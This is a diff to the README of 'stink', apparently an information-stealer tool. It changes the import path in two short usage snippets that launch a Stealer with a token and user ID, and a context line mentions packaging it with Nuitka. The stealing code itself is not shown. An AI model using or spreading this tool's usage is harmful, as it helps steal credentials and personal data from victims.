@@ -52,7 +52,7 @@ The `stink` already has an impressive functionality that will only expand.
 ## Example usage
 ### Standard
 ```python
-from stink.multistealer import Stealer
+from stink import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
@@ -135,7 +135,7 @@ We will need Nuitka to do this.
 2. Unpack the archive and go to the directory stink-master.
 3. Create test.py (or any other name) file in the same directory with the following code:
 ```python
-from stink.multistealer import Stealer
+from stink import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
